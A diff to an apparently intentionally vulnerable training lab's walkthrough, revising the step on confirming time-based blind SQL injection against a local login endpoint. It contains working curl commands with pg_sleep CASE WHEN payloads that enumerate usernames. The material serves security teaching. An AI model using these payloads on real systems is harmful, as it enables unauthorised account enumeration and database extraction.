@@ -36,7 +36,6 @@ By testing conditions character by character, an attacker can reconstruct any st
 
 ```bash
 docker compose up -d
-dotnet run --project src/BookingDojo.Api -- --seed-and-exit
 dotnet run --project src/BookingDojo.Api &
 dotnet run --project src/BookingDojo.Bff &
 cd src/bookingdojo-ui && npm run dev &
@@ -76,44 +75,42 @@ Both failures and successes return the same error message. There is no visible d
 
 ## Step 2 — Confirm blind injection with a timing probe
 
-Submit a username that includes a conditional sleep. Use `time` to measure the response:
+Use `CASE WHEN` to make the sleep conditional on whether a username exists. Use `time` to measure:
 
 ```bash
+# admin exists — should take ~3 seconds
 time curl -s -X POST http://localhost:5001/bff/auth/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"admin'\'' AND 1=(SELECT 1 FROM pg_sleep(3))--","password":"x"}' | jq .
+  -d "{\"username\":\"x' OR 1=(SELECT 1 FROM pg_sleep(CASE WHEN (SELECT COUNT(*) FROM bookingdojo.\\\"Users\\\" WHERE \\\"Username\\\"='admin')>0 THEN 3 ELSE 0 END))--\",\"password\":\"x\"}" | jq .
+
+# doesnotexist — should be immediate
+time curl -s -X POST http://localhost:5001/bff/auth/login \
+  -H "Content-Type: application/json" \
+  -d "{\"username\":\"x' OR 1=(SELECT 1 FROM pg_sleep(CASE WHEN (SELECT COUNT(*) FROM bookingdojo.\\\"Users\\\" WHERE \\\"Username\\\"='doesnotexist')>0 THEN 3 ELSE 0 END))--\",\"password\":\"x\"}" | jq .
 ```
 
-The username payload (unescaped) is:
-
-```
-admin' AND 1=(SELECT 1 FROM pg_sleep(3))--
-```
-
-This becomes:
+The injected SQL (for `admin`):
 
 ```sql
-SELECT "Id", "Username", "PasswordHash", "Role", "PartnerId"
+SELECT ...
 FROM bookingdojo."Users"
-WHERE "Username" = 'admin' AND 1=(SELECT 1 FROM pg_sleep(3))--'
+WHERE "Username" = 'x'
+   OR 1=(SELECT 1 FROM pg_sleep(
+        CASE WHEN (SELECT COUNT(*) FROM bookingdojo."Users" WHERE "Username"='admin')>0
+             THEN 3 ELSE 0 END))--'
 ```
 
-- PostgreSQL finds the `admin` row, then evaluates the AND.
-- `pg_sleep(3)` executes — the query sleeps 3 seconds.
-- The row is returned to the application, but `BCrypt.Verify("x", hash)` fails → 401.
-- **Response is 401, but it took ~3 seconds.**
+- The inner `SELECT COUNT(*)` asks: does `admin` exist?
+- If yes → `CASE WHEN` returns 3 → `pg_sleep(3)` → response delayed ~3 seconds.
+- If no → `CASE WHEN` returns 0 → `pg_sleep(0)` → immediate response.
+- Both return **401** — the only difference is time.
 
-Now try with a username that does not exist:
+> **Why not `admin' AND pg_sleep(3)--`?**
+> PostgreSQL does not guarantee short-circuit evaluation. A `pg_sleep` in a subquery
+> may execute regardless of other conditions. Always use `CASE WHEN` to make the
+> sleep conditional, not just present.
 
-```bash
-time curl -s -X POST http://localhost:5001/bff/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"nobody'\'' AND 1=(SELECT 1 FROM pg_sleep(3))--","password":"x"}' | jq .
-```
-
-`nobody` matches no row — the AND is never evaluated — no sleep — immediate 401.
-
-**The timing difference confirms injection and reveals valid usernames.**
+**The 3-second gap confirms injection and enumerates valid usernames.**
 
 ---
 
